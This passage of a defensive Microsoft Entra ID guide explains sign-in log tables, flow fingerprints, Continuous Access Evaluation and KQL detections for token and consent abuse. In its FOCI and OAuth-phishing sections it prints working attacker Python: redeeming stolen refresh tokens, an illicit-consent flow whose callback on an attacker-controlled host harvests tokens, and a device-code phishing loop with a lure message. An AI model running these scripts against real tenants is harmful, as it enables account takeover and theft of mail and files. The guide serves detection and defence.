  "LocationDetails": {
    "city": "Amsterdam",
    "countryOrRegion": "NL",
    "geoCoordinates": {"latitude": 52.3676, "longitude": 4.9041}
  },
  "Location": "NL",
  "ConditionalAccessPolicies": [
    {
      "id": "9988aabb-ccdd-eeff-0011-223344556677",
      "displayName": "Block device code flow",
      "enforcedGrantControls": ["Block"],
      "result": "notApplied",
      "conditionsSatisfied": 0,
      "conditionsNotSatisfied": 1
    }
  ],
  "AuthenticationDetails": [
    {
      "authenticationStepDateTime": "2026-05-08T12:05:42.901Z",
      "authenticationMethod": "Password",
      "authenticationMethodDetail": "Password in the cloud",
      "succeeded": true,
      "authenticationStepRequirement": "Primary authentication"
    },
    {
      "authenticationStepDateTime": "2026-05-08T12:05:43.770Z",
      "authenticationMethod": "Mobile app notification",
      "authenticationMethodDetail": "Microsoft Authenticator app",
      "succeeded": true,
      "authenticationStepRequirement": "Multifactor authentication"
    }
  ],
  "AuthenticationProcessingDetails": [
    {"key": "Login Hint Present", "value": "False"},
    {"key": "Oauth Scope Info", "value": "[\"User.Read\",\"openid\",\"profile\",\"offline_access\"]"}
  ]
}
```

### ROPC — DEPRECATED

User hands their password to your app, your app sends it to Entra. Bypasses MFA, Conditional Access, federation, passwordless. Don't use it. Block it. The Microsoft identity platform deprecated this for public client flows; it'll be removed entirely.

```python
# Shown so you recognize it in old code; do not deploy this.
tokens = requests.post(
    f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token",
    data={
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": "alice@contoso.onmicrosoft.com",
        "password": "hunter2",
        "scope": "User.Read",
    },
).json()
```

Log fingerprint: `AuthenticationProtocol == "ropc"`. Every hit is a ticket — credential-spray attacks hit the token endpoint directly with this grant type rather than going through the browser sign-in page.

```json
{
  "TenantId": "your-tenant-id",
  "TimeGenerated": "2026-05-08T12:33:01.009Z",
  "Id": "11223344-5566-7788-99aa-bbccddeeff00",
  "CreatedDateTime": "2026-05-08T12:33:01.009Z",
  "UserPrincipalName": "alice@contoso.onmicrosoft.com",
  "AppId": "11111111-2222-3333-4444-555555555555",
  "AppDisplayName": "Legacy Inventory Tool",
  "ClientAppUsed": "Mobile Apps and Desktop clients",
  "IsInteractive": false,
  "IncomingTokenType": "none",
  "AuthenticationProtocol": "ropc",
  "AuthenticationRequirement": "singleFactorAuthentication",
  "ResultType": "0",
  "ResultSignature": "None",
  "Status": {
    "errorCode": 0
  },
  "AuthenticationDetails": [
    {
      "authenticationMethod": "Password",
      "authenticationMethodDetail": "Password in the cloud",
      "succeeded": true,
      "authenticationStepRequirement": "Primary authentication"
    }
  ],
  "AuthenticationProcessingDetails": [
    {"key": "Oauth Scope Info", "value": "[\"User.Read\"]"}
  ]
}
```

### Implicit — DEPRECATED

Old SPA flow: tokens delivered in URL fragment. Replaced by auth code + PKCE for SPAs. Tokens in URL fragments end up in browser history, referrer headers, JavaScript globals — every place tokens shouldn't be. If you see `AuthenticationProtocol == "oAuth2Implicit"` in your logs it's probably an old AngularJS app from 2018 — find it and migrate it.

### Hybrid (`response_type=code id_token`)

Server-side web app gets *both* an auth code (to exchange server-side for AT/RT) **and** an ID token (delivered immediately to the client) in the same round trip. Used by ASP.NET's old OpenIdConnect middleware. The differences from §2: `response_type=code id_token`, `response_mode=form_post` (so the ID token doesn't end up in browser history), nonce required (because the ID token comes via the front channel). In logs it looks essentially identical to plain auth code — `AuthenticationProtocol == "none"` like other OAuth-family flows.

### SAML 2.0

Not OAuth/OIDC, but Entra speaks it heavily for legacy enterprise apps. Different protocol, different endpoint (`/saml2`), different ceremony (POST binding, signed assertions, no access tokens, no refresh tokens). In sign-in logs SAML shows up as `AuthenticationProtocol == "saml2.0"` (sometimes `"saml"`) and `TokenIssuerType == "AzureAD"`. The resource is the SAML-configured enterprise app (e.g., Salesforce, Workday).

---

# Part II — Defending the Tenant

Now that the protocols are concrete, the rest of the guide is operational: reading the logs they produce, identifying the abuse patterns built on them, and the controls and runbooks that cut them off.

---

## 6. The log streams and how to read them

Entra splits sign-in events across four tables. Each one has a clear purpose:

| Table | What goes here |
|---|---|
| `SigninLogs` | Interactive user sign-ins. The user typed something, clicked something, completed MFA. |
| `AADNonInteractiveUserSignInLogs` | Silent token acquisitions: refresh token redemptions, OBO exchanges. **Highest volume by far.** |
| `AADServicePrincipalSignInLogs` | App-only auth — client credentials, daemon flows. No user. |
| `AADManagedIdentitySignInLogs` | Azure managed identity token issuance. Mostly Azure-internal, low signal. |
| `AuditLogs` | Configuration changes — consents granted, apps registered, roles assigned, policies modified. |

A complete defensive view of an authentication usually requires a `union` of the first three plus a join into `AuditLogs` on user/app identity. Restricting yourself to `SigninLogs` is the most common rookie mistake — you'll miss everything that happens after the door opens.

### Volume reality check

For a typical 10,000-user tenant with normal Microsoft 365 usage:
- `SigninLogs`: ~50–100k rows/day
- `AADNonInteractiveUserSignInLogs`: **1–10 million rows/day** (this is where Sentinel costs come from)
- `AADServicePrincipalSignInLogs`: ~100k–1M rows/day, depending on automation
- `AuditLogs`: ~5–20k rows/day

Plan retention and ingestion accordingly. Most tenants don't need full non-interactive sign-in detail beyond 30–90 days; archive older data to cheaper storage and run hunts there.

### Key fields to internalize

The fields you'll touch in 80% of queries:

- `UserPrincipalName`, `UserId` — identity. `UserId` (objectId) is stable; UPN can change on rename.
- `AppId`, `AppDisplayName` — the *client* application acquiring a token.
- `ResourceId`, `ResourceDisplayName` — the *resource* API the token targets.
- `IpAddress`, `Location` — where the token request came from.
- `ConditionalAccessStatus` — `success`, `failure`, `notApplied`, `disabled`.
- `RiskLevelDuringSignIn`, `RiskState`, `RiskEventTypes_v2` — Identity Protection signals.
- `AuthenticationRequirement` — `singleFactorAuthentication` vs `multiFactorAuthentication`.
- `AuthenticationProtocol` — flow identifier.
- `IncomingTokenType` — what was traded in to get this token.
- `AuthenticationDetails` — array of factor steps (Password, MFA, "Previously satisfied").
- `AuthenticationProcessingDetails` — key/value bag including `Is CAE Token`, `Oauth Scope Info`, `Authentication credential used`.
- `DeviceDetail` — `deviceId`, `isCompliant`, `isManaged`, `trustType`.
- `Status` — `errorCode` (0 = success), `failureReason`, `additionalDetails`.

`Status.errorCode != 0` doesn't always mean "bad" — error code 50058 is "no signed-in user," which is a normal pre-auth state. Learn the [AADSTS error codes](https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes) you actually care about.

---

## 7. Identifying flows from log signals

You should be able to look at a sign-in log row and immediately name the flow. Cheatsheet:

| Log signal | Flow |
|---|---|
| `IncomingTokenType == "none"` + `IsInteractive == true` + `ClientAppUsed == "Browser"` + `ResourceDisplayName` set | Authorization code + PKCE (interactive) |
| `IncomingTokenType` in (`"refreshToken"`, `"primaryRefreshToken"`) + `IsInteractive == false` | Refresh token redemption |
| In `AADServicePrincipalSignInLogs` + no user + `Authentication credential used` set | Client credentials |
| `IncomingTokenType == "jwt"` + non-interactive + user present + appId is API not client | On-Behalf-Of |
| `AuthenticationProtocol == "deviceCode"` | Device code |
| `AuthenticationProtocol == "ropc"` | ROPC (investigate every hit) |
| `AuthenticationProtocol == "oAuth2Implicit"` | Implicit (deprecated, find and migrate) |
| `AuthenticationProtocol` in (`"saml2.0"`, `"saml"`, `"wsFederation"`) | SAML / WS-Fed enterprise app SSO |

> ### `AuthenticationProtocol` in practice: an important calibration
>
> Earlier versions of this guide leaned on `AuthenticationProtocol == "oAuth2"` as the primary fingerprint for OAuth flows. **In production tenants this is wrong.** The field's actual behavior, validated against real high-volume tenant data:
>
> - **OAuth-based flows** (auth code + PKCE, refresh, hybrid, OBO) typically show `AuthenticationProtocol` as **`"none"`** or **empty/null**. OAuth/OIDC is Entra's implicit baseline, so the field doesn't bother labeling it.
> - **Non-OAuth flows** (SAML, WS-Fed, device code, ROPC) are where the field is reliably populated, because that's what it exists to differentiate. You'll see `"saml2.0"` (sometimes `"saml"`), `"wsFederation"`, `"deviceCode"`, `"ropc"`.
> - The Microsoft Graph schema reflects this asymmetry — there's a separate `authenticationProtocol` enum on the `samlOrWsFedProvider` resource type with only `wsFed`, `saml`, `unknownFutureValue` as values, no OAuth value at all. (That's the Graph-side schema for *configuring* federated IdPs — separate from the `AuthenticationProtocol` column in `SigninLogs` that we care about here.)
>
> **What this means for the cheatsheet above:** for the OAuth-family flows (auth code, refresh, OBO), do not filter on `AuthenticationProtocol`. Use `IncomingTokenType`, `ClientAppUsed`, `IsInteractive`, and `ResourceDisplayName` instead — these are populated consistently and they actually distinguish the flows. Only use `AuthenticationProtocol` as a positive filter for SAML, WS-Fed, device code, ROPC, and implicit, where it's the cleanest signal.
>
> The JSON examples in Part I (§§2–5) reflect this: OAuth-family flows show `"AuthenticationProtocol": "none"`, and the non-OAuth flows show their respective values (`"deviceCode"`, `"ropc"`, `"saml2.0"`, etc.). All field names in those samples use the Log Analytics column-name format (PascalCase) so you can copy any field directly into a KQL query — see the data-source note at the top of the guide for the corresponding Defender XDR field names.

KQL to summarize what your tenant actually uses, leaning on the right fields:

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs, AADServicePrincipalSignInLogs
| where TimeGenerated > ago(7d)
| extend Protocol = tostring(AuthenticationProtocol)
| extend Incoming = tostring(IncomingTokenType)
| summarize Count = count() 
    by Protocol, Incoming, ClientAppUsed, AppDisplayName
| sort by Count desc
```

Run this on day one of any new role. Most rows will land in `Protocol == "none"` + `Incoming == "none"` (OAuth fresh auth) or `Protocol == "none"` + `Incoming == "primaryRefreshToken"` (OAuth refresh). The interesting tails are everything else — `"saml2.0"`, `"deviceCode"`, `"ropc"`, `"oAuth2Implicit"`, or any value you don't recognize. Investigate the tails.

The HTTP each flow generates — and the log row each call produces — is covered in detail in Part I (§§2–5). If a fingerprint above is unfamiliar, jump back: every `IncomingTokenType` value maps to a specific request shape there.

---

## 8. The Azure Portal sign-in dissected

A worked example of how one user action produces a cascade of log rows.

**User action:** Open `portal.azure.com`, click Subscriptions, click an IAM blade, open Key Vault.

**Log rows produced (typical):**

1. **One row in `SigninLogs`** — auth code + PKCE for `appId = c44b4083-3bb0-49c1-b47d-974e53cbdf3c` (Azure Portal). The first interactive sign-in row. The resource on this row varies — typically Microsoft Graph or ARM (`https://management.core.windows.net`), depending on what the SPA needs first; both are requested very early in the session.
2. **5–15 rows in `AADNonInteractiveUserSignInLogs`** — refresh token redemptions for ARM, Storage, Key Vault, Cost Mgmt, Defender, Log Analytics, Policy. `IncomingTokenType = primaryRefreshToken`. Same `AppId` (Portal), different `ResourceId`.
3. **3–10 rows in `AADNonInteractiveUserSignInLogs`** — OBO exchanges from ARM/other backends to Graph. `AppId` is now ARM (`797f4846-...`), user is still the user, `IncomingTokenType = jwt`. IPs on these rows are *internal* Microsoft IPs, not the user's.
4. **0–N rows in `SigninLogs`** — CAE re-auths if anything triggered token revocation mid-session.

The defender takeaway: **detections built only on `SigninLogs` see the door open but not what happens in the room.** A hijacked session continues silently in `AADNonInteractiveUserSignInLogs` for hours, with the attacker's IP visible there but not in `SigninLogs`.

KQL to view one user's full session:

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated between (datetime(2026-05-08T13:00:00Z) .. datetime(2026-05-08T14:00:00Z))
| where UserPrincipalName == "alice@contoso.onmicrosoft.com"
| project TimeGenerated, AppDisplayName, ResourceDisplayName, IncomingTokenType, 
          IpAddress, IsInteractive, ConditionalAccessStatus, ResultType
| order by TimeGenerated asc
```

---

## 9. Continuous Access Evaluation for defenders

CAE is one of those features where the marketing description ("real-time token revocation!") undersells the operational complexity. For defenders the key thing to understand is that CAE isn't a switch you flip — it's a **negotiation between three parties**, all of which have to opt in independently, and which can silently fail in ways that look fine in the portal but leave you with no actual revocation.

### How CAE actually works

The core trade-off CAE makes: instead of issuing short-lived (~75 minute) access tokens that clients constantly renew, Entra issues **long-lived tokens** — up to **28 hours** for users, **24 hours** for workload identities — that the resource API can **reject mid-flight** when something changes. Fewer token round-trips, near-real-time revocation, better resilience and security at once. (For workload identities specifically, *managed identities aren't supported* for CAE — only service principals for line-of-business apps. That's a real gap.)

The negotiation has three required parties:

**1. The resource API has to be CAE-enabled.** Microsoft has rolled this out gradually since 2020 — Microsoft Graph, Exchange Online, SharePoint Online, Teams, ARM. Custom APIs you build don't get CAE unless you implement the protocol on the resource side, which almost no one has. Storage data plane and Key Vault data plane are not CAE-enabled. This is the gotcha most people miss: CAE isn't a tenant setting that just turns on for everything.

**2. The client has to declare `cp1` in its client capabilities.** This is a string the app sends in the token request that means "I understand the claims challenge protocol, you can give me a long-lived token, I'll handle 401 responses correctly." MSAL libraries set this automatically when configured to. The authoritative way to verify a token is CAE-capable is to check for `"xms_cc": ["CP1"]` in the issued access token's claims.

**3. The session has to be eligible.** No policy blocking it, the user's session was issued with CAE awareness, the client connects in a way that supports the revocation signal path. **Guest user accounts are not supported by CAE** — that's a notable defender-relevant exclusion.

If all three line up, the access token gets a long lifetime and a `xms_cc: ["CP1"]` claim. If any one of them doesn't, you get a normal ~75-minute token with no CAE — even if the resource and client are both modern.

### What revocation actually responds to

CAE doesn't react to "anything." It reacts to a specific list of **critical events**:

- User account deletion or disable.
- User password change or reset.
- MFA being enabled for the user.
- Admin explicitly revoking refresh tokens (`Revoke-MgUserSignInSession`).
- User flagged as high-risk by Identity Protection.
- Token's IP changing outside the trusted IP ranges defined in a Conditional Access location policy (when "Strict Location Enforcement" is enabled).

Two important latency notes from Microsoft's own docs: critical events propagate in **near-real-time but with up to 15-minute latency** because of event distribution time. **IP location enforcement is instant.** So password resets and account disables protect within ~10 minutes; an attacker exfiltrating a stolen token from outside trusted IPs gets cut off the moment they make a request.

### The claims challenge mechanic

The actual revocation flow that defenders need to understand:

1. Token gets revoked (one of the events above fires).
2. Attacker (or legitimate user) makes an API call to a CAE-enabled resource with the now-stale token.
3. Resource returns **HTTP 401** with a `WWW-Authenticate` header containing a base64-encoded `claims` directive — the *claims challenge*.
4. CAE-capable client recognizes the challenge, calls `/token` again with the original refresh token plus the `claims` parameter.
5. Entra reevaluates the user's current state, applies any new policies, and either issues a fresh token or forces interactive re-auth.

The `WWW-Authenticate` header looks like this:

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="", authorization_uri="https://login.microsoftonline.com/common/oauth2/authorize",
                  error="insufficient_claims",
                  claims="eyJhY2Nlc3NfdG9rZW4iOnsiYWNycyI6eyJlc3NlbnRpYWwiOnRydWUsInZhbHVlIjoiY3AxIn19fQ=="
```

The base64 `claims` value decodes to a JSON object describing what new claims the client needs to acquire. MSAL handles this transparently when the client app declares `cp1` capability; non-MSAL hand-rolled clients have to extract the claims value from the header and pass it to the next `/token` call as a `claims` parameter.

### Verifying CAE is actually working in your tenant

The "is CAE working" question has multiple layers. Each can fail independently.

**Method 1 — Check the sign-in logs (most reliable, ground truth):**

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(7d)
| extend ProcDetails = parse_json(AuthenticationProcessingDetails)
| mv-expand ProcDetails
| where tostring(ProcDetails.key) == "Is CAE Token"
| extend IsCAE = tostring(ProcDetails.value)
| summarize 
    Total = count(),
    CAETokens = countif(IsCAE == "True"),
    NonCAETokens = countif(IsCAE == "False")
    by AppDisplayName, ResourceDisplayName
| extend CAEPercent = round(100.0 * CAETokens / Total, 1)
| sort by Total desc
```

Each row is a (client app, resource API) pair with the CAE issuance rate. Patterns to expect:

- Microsoft Graph + modern Microsoft apps (Teams, Outlook, Azure Portal, OneDrive sync) → close to 100% CAE.
- ARM + Azure Portal / CLI / PowerShell → high CAE rate.
- Exchange Online + Outlook → high CAE rate.
- Custom APIs you build → 0%. Always. Unless you implemented CAE on the resource side.
- Legacy apps using ROPC, device code, or implicit → 0% or sporadic.

**If a CAE-eligible app/resource pair shows 0% CAE, something is downgrading the session.** Investigate the client — it's probably not declaring `cp1`.

**Method 2 — Decode an actual access token:** paste it into [jwt.ms](https://jwt.ms), look for:

- `xms_cc` containing `"CP1"` (or `"cp1"`) — the *client* declared CAE capability.
- `exp - iat` lifetime: ~3600s = standard hour token (no CAE), ~86400s+ = long-lived CAE token.
- `xms_ssm` (session management) — its presence indicates a session-bound, CAE-evaluable token.

If you see `xms_cc: ["CP1"]` AND a 1-hour expiry, the client *asked* for CAE but the *resource* doesn't support it, so Entra issued a normal token. If `xms_cc` is missing entirely, the client never asked for CAE.

**Method 3 — Check tenant CA policy.** Conditional Access → Session controls → Customize continuous access evaluation. Three options:

- **Disable** — no CAE for anyone (don't pick this).
- **Migrate** — default; CAE enabled for capable client/resource pairs.
- **Strict Location Enforcement** — CAE additionally revokes when user IP changes outside trusted locations.

Some tenants also have a *Strict Enforcement* mode that requires CAE-capable clients; non-CAE clients are blocked rather than falling back to short-lived tokens. Check your CA policy state to know which mode you're actually in.

**Method 4 — Audit your own apps' client capabilities.** If you build apps that consume Microsoft APIs, decode their tokens and check `xms_cc`. For MSAL Python, the opt-in is `client_capabilities=["cp1"]` on the constructor. Modern Azure SDKs (`azure-identity`, etc.) set CP1 automatically when talking to ARM. Hand-rolled implementations against `/token` directly don't get CAE without explicitly requesting it.

### What this means for detection logic

CAE is mostly a defense win — revocation is fast — but it changes how sessions look in your logs in ways that trip up naive detections.

**A single user can have multiple `SigninLogs` rows in an hour as CAE re-auths happen.** This is normal, not anomalous. A claims-challenge-driven re-auth produces a fresh interactive sign-in row even though the user didn't see a prompt. Detections counting "interactive sign-ins per user per hour" need to know this — multiple rows from one user in a CAE-enabled tenant doesn't mean repeated authentication attempts.

**The famous "Is CAE Token: True on the sign-in but False on subsequent rows" gotcha.** Defenders see this and assume CAE broke. Usually what's happening is the SPA acquired a token for a non-CAE resource (Storage data plane, Key Vault data plane, your custom API) on top of a CAE-capable session — the *session* is still CAE, but that *particular access token* isn't, because the resource doesn't participate. Session-level and per-token CAE state are different things.

**Detections shouldn't fire on claims-challenge re-auths.** When CAE revokes a token and the client re-authenticates via the claims challenge mechanic, the resulting `SigninLogs` row looks like a brand-new interactive sign-in. If your "user signed in from a new country" detection fires here without context, you'll alert on the user's perfectly normal post-revocation re-auth from their actual location. Filter for `IsCAEToken == "True"` AND check whether the prior token was revoked recently.

**Strict Location Enforcement makes IP-based detections obsolete on CAE-eligible apps.** Once enforced, a token used outside trusted IPs is killed by the resource itself within seconds. Your "user signed in from anonymous proxy" detection is doing nothing the resource isn't already doing — except it fires after the fact, on the post-revocation re-auth, which is even more confusing. Re-scope IP-anomaly detections to non-CAE apps where this enforcement gap actually matters.

### Practical recommendation

If you're new to a tenant: run Method 1's KQL on day one. The output tells you which app/resource pairs are getting CAE and which aren't, and that's the map of "where revocation works fast" vs "where revocation depends on token expiry." That distinction drives a surprising amount of incident-response time-to-contain math — for non-CAE pairs, after revoking a session you're waiting up to ~75 minutes for active access tokens to die naturally. For CAE pairs, you're waiting ~10 minutes (the propagation latency) at most, and seconds for IP-based revocation. Knowing which apps fall into which category before an incident is what lets you give an honest containment-time estimate during one.

---

## 10. First-party client IDs and FOCI abuse

Microsoft pre-registers ~2000 first-party apps in every tenant. A subset are public clients with broad pre-consented scopes, and a smaller subset (the FOCI family) share refresh tokens. Attackers borrow these client IDs because they don't require app registration and don't trigger consent prompts.

### Client IDs to know

The ones most often abused in incident response. The "FOCI" column reflects the canonical Secureworks research; Microsoft has not published an official list and the family may grow over time.

| Client ID | App | FOCI? | Why attackers like it |
|---|---|---|---|
| `04b07795-8ddb-461a-bbee-02f9e1bf7b46` | Microsoft Azure CLI | Yes | Pre-consented to ARM + Graph |
| `1950a258-227b-4e31-a9cf-717495945fc2` | Microsoft Azure PowerShell | Yes | ARM + Graph |
| `1b730954-1685-4b74-9bfd-dac224a7b894` | Azure AD PowerShell (legacy) | No | Directory access (deprecated module but still works) |
| `14d82eec-204b-4c2f-b7e8-296a70dab67e` | Microsoft Graph Command Line Tools | No | Default app for `Connect-MgGraph`, broad Graph scopes |
| `d3590ed6-52b3-4102-aeff-aad2292ab01c` | Microsoft Office | Yes | Mailbox + files |
| `1fec8e78-bce4-4aaf-ab1b-5451cc387264` | Microsoft Teams | Yes | Teams + Graph |
| `872cd9fa-d31f-45e0-9eab-6e460a02d1f1` | Visual Studio | Yes | Broad developer scopes |
| `27922004-5251-4030-b22d-91ecd9a37ea4` | Outlook Mobile | Yes | Mail |
| `4813382a-8fa7-425e-ab75-3b753aab3abb` | Microsoft Authenticator App | Yes | Used in some MFA-bypass scenarios |
| `ab9b8c07-8f02-4f72-87fa-80105867a763` | OneDrive SyncEngine | Yes | Files |
| `00b41c95-dab0-4487-9791-b9d2c32c80f2` | Office 365 Management | Yes | Mgmt scopes |

The full canonical FOCI list (15 confirmed clients as of the original Secureworks publication, though the list is expected to grow) is at `secureworks/family-of-client-ids-research`. Microsoft itself stated it does not publish the list because "the list changes frequently."

### FOCI abuse pattern

A FOCI refresh token issued for, say, Microsoft Teams can be redeemed for an access token targeting *any other FOCI client's* pre-consented resources. So an attacker who phishes a Teams sign-in can pivot to Office's mailbox scopes or Visual Studio's source-control scopes without re-prompting the user.

### What the abuse looks like on the wire

The pivot is a single HTTP call to `/token`. Attacker has stolen a refresh token issued to (say) Teams, and uses it to get an Outlook-grade mail scope by claiming to be Microsoft Office:

```python
# Attacker has a Teams-issued refresh token
stolen_rt = "0.AXoA..."

# Redeem it as Microsoft Office (a different FOCI client) for mail scopes
resp = requests.post(
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
    data={
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",   # Microsoft Office
        "grant_type": "refresh_token",
        "refresh_token": stolen_rt,                              # issued for Teams
        "scope": "https://outlook.office.com/Mail.Read",
    },
)
tokens = resp.json()
# tokens["access_token"] now lets the attacker read mail
# tokens["refresh_token"] is a new RT, also usable across the FOCI family
```

The Microsoft identity platform returns a working access token. The user never sees a prompt. The original Teams sign-in shows in `SigninLogs` like any other Teams use; the FOCI redemption shows in `AADNonInteractiveUserSignInLogs` as Microsoft Office acquiring an Outlook token.

The abuse pattern that follows: the attacker also targets first-party **public** clients with no FOCI involvement at all, using the well-known IDs as a shortcut around app registration. If the attacker has a stolen credential or AiTM-captured token, this is a single line of Python:

```python
# No app registration needed — Azure CLI's ID is in every tenant
resp = requests.post(
    "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
    data={
        "client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",   # Azure CLI
        "grant_type": "refresh_token",
        "refresh_token": stolen_rt,
        "scope": "https://graph.microsoft.com/.default",
    },
)
```

In your logs this looks like *Alice using Azure CLI to talk to Graph*. The defender's only signal is whether Alice actually uses Azure CLI — and whether the IP on this row matches her normal pattern.

### Detection: misuse of first-party clients

The Sentinel-pattern detection: tokens for first-party admin tools being redeemed against resources those tools don't normally hit.

```kql
SigninLogs
| where AppId in (
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",   // Azure CLI
    "1950a258-227b-4e31-a9cf-717495945fc2",   // Azure PowerShell
    "1b730954-1685-4b74-9bfd-dac224a7b894"    // legacy AAD PowerShell
  )
| where ResourceIdentity !in (
    "00000003-0000-0000-c000-000000000000",   // Microsoft Graph
    "797f4846-ba00-4fd7-ba43-dac1f8f63013",   // ARM
    "00000002-0000-0000-c000-000000000000"    // legacy AAD Graph
  )
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, AppDisplayName, ResourceDisplayName, IpAddress
```

Azure CLI tokens hitting Exchange Online or SharePoint = investigate.

### Establishing a baseline

Run this once and snapshot it:

```kql
union SigninLogs, AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(30d)
| where AppDisplayName startswith "Microsoft" or ResourceTenantId == "f8cdef31-a31e-4b4a-93e4-5f571e91255a"  // MS first-party tenant
| summarize Users = dcount(UserPrincipalName), Tokens = count() by AppId, AppDisplayName
| sort by Tokens desc
```

The list you get is your tenant's first-party app baseline. Anything new appearing later — especially a FOCI client suddenly used by a user who's never used it before — is worth a look.

---

## 11. OAuth phishing and illicit consent grants

The user authenticates to real Microsoft, real MFA, real consent prompt. They click Accept on a malicious app. The attacker now has a refresh token. **This is the most underdetected major attack class in Entra**, because the sign-in log row looks completely normal.

### What the attacker's code actually looks like

The attack is mechanically just the auth code + PKCE flow with a malicious `client_id`. Here's the entire attacker-side implementation:

```python
# Attacker has registered a multi-tenant app called e.g. "Microsoft Security Update"
# in their own attacker.onmicrosoft.com tenant, with sensitive scopes pre-configured.

ATTACKER_CLIENT_ID = "abcd1234-..."   # registered in attacker's tenant
ATTACKER_REDIRECT  = "https://attacker-controlled.example.com/callback"

# Step 1: craft the phishing URL — note this points at the REAL Microsoft endpoint
# and targets the VICTIM'S tenant
phishing_url = "https://login.microsoftonline.com/victim-tenant.com/oauth2/v2.0/authorize?" + urllib.parse.urlencode({
    "client_id": ATTACKER_CLIENT_ID,
    "response_type": "code",
    "redirect_uri": ATTACKER_REDIRECT,
    "scope": "Mail.Read Files.Read.All offline_access openid profile",
    "state": "anything",
    # PKCE optional for this attack — the attacker controls both ends
})
# Email this URL to the victim with social engineering pretext.
# Victim clicks → real Microsoft login → real MFA → real consent prompt for
# "Microsoft Security Update wants Mail.Read, Files.Read.All, ..." → Accept
# → 302 to ATTACKER_REDIRECT?code=...

# Step 2: attacker's server redeems the code (this runs on attacker infra)
@app.route("/callback")
def harvest():
    code = flask.request.args["code"]
    tokens = requests.post(
        "https://login.microsoftonline.com/victim-tenant.com/oauth2/v2.0/token",
        data={
            "client_id": ATTACKER_CLIENT_ID,
            "client_secret": ATTACKER_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": ATTACKER_REDIRECT,
            "scope": "Mail.Read Files.Read.All offline_access",
        },
    ).json()
    # tokens["refresh_token"] = persistent access for as long as the consent stands.
    # Stash it. From here, just call /me/messages on Graph forever.
    save_for_later(victim=tokens["id_token"], rt=tokens["refresh_token"])
```

That's the entire attack. There is no malware, no exploit, no MFA bypass. Microsoft did everything correctly. The user did everything their threat model said to do. The vulnerability is the user's mental model of "what does Accept on this prompt mean."

The **device code variant** is even simpler — no app registration, no callback handler:

```python
# Attacker initiates device code flow against a Microsoft first-party client
# in the VICTIM's tenant — no app registration needed
flow = requests.post(
    "https://login.microsoftonline.com/victim-tenant.com/oauth2/v2.0/devicecode",
    data={
        "client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",   # Azure CLI
        "scope": "https://graph.microsoft.com/.default offline_access",
    },
).json()

# Email to victim: "IT helpdesk: please complete authentication for the new
# security tool by going to https://microsoft.com/devicelogin and entering G7H3K9P2"
# (The URL and code are real.)
victim_message = flow["message"]
device_code = flow["device_code"]

# Attacker polls for completion
while True:
    poll = requests.post(
        "https://login.microsoftonline.com/victim-tenant.com/oauth2/v2.0/token",
        data={
            "client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "device_code": device_code,
        },
    )
    if poll.status_code == 200:
        tokens = poll.json()
        # Now attacker has Graph + offline_access via Azure CLI's pre-consents.
        # All of Alice's mail, files, contacts, calendar — readable indefinitely.
        break
    time.sleep(flow["interval"])
```

No app registration. No multi-tenant app the user has to consent to. Borrows Azure CLI's existing pre-consents. The victim sees the *real* `microsoft.com/devicelogin` page asking them to confirm sign-in to *Azure CLI* — a name they probably trust.

### The signal lives in `AuditLogs`, not sign-in logs

Every consent grant emits an `AuditLogs` row with `OperationName == "Consent to application"`. The current operation names you should know — confirmed via Microsoft's app-management audit reference — are: Add app role assignment to service principal, Add application, Add delegated permission grant, Update application – Certificates and secrets management (with a trailing space), and Consent to application.

### Primary detection: sensitive consent grants

```kql
AuditLogs
| where TimeGenerated > ago(1d)
| where OperationName == "Consent to application"
| extend AppDisplayName = tostring(TargetResources[0].displayName)
| extend ModifiedProps = TargetResources[0].modifiedProperties
| mv-expand ModifiedProps
| extend PropName = tostring(ModifiedProps.displayName)
| extend PropNew = tostring(ModifiedProps.newValue)
| where PropName == "ConsentAction.Permissions"
| extend Permissions = PropNew
| where Permissions has_any (
    "Mail.Read", "Mail.ReadWrite", "Mail.Send",
    "Files.Read.All", "Files.ReadWrite.All",
    "Sites.Read.All", "Sites.ReadWrite.All",
    "Directory.Read.All", "Directory.ReadWrite.All",
    "User.Read.All", "User.ReadWrite.All",
    "Application.ReadWrite.All",
    "AppRoleAssignment.ReadWrite.All",
    "RoleManagement.ReadWrite.Directory",
    "offline_access"
  )
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| project TimeGenerated, ActorUPN, AppDisplayName, Permissions
| sort by TimeGenerated desc
```

Tune the scope list to your environment. `offline_access` plus any read scope is the minimum-viable phishing payload.

### Enrichment: is the app new and unfamiliar?

A consent grant to a brand-new service principal in your tenant is much more suspicious than a consent to an app that's been around for months. Join consent events to service-principal creation:

```kql
let recentSPs =
    AuditLogs
    | where TimeGenerated > ago(7d)
    | where OperationName == "Add service principal"
    | extend SPName = tostring(TargetResources[0].displayName)
    | extend SPId = tostring(TargetResources[0].id)
    | project SPCreatedTime = TimeGenerated, SPName, SPId;
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName == "Consent to application"
| extend AppName = tostring(TargetResources[0].displayName)
| extend SPId = tostring(TargetResources[0].id)
| join kind=inner recentSPs on SPId
| extend ActorUPN = tostring(InitiatedBy.user.userPrincipalName)
| project TimeGenerated, ActorUPN, AppName, SPCreatedTime, MinutesSinceSPCreation = datetime_diff('minute', TimeGenerated, SPCreatedTime)
| sort by MinutesSinceSPCreation asc
```

Consent to an app whose service principal was created less than 24 hours earlier is a strong phishing indicator.

### Admin consent: the highest-priority alert

Admin consent grants permissions for the entire tenant. This should be a P1 paging alert:

```kql
AuditLogs
| where TimeGenerated > ago(1h)
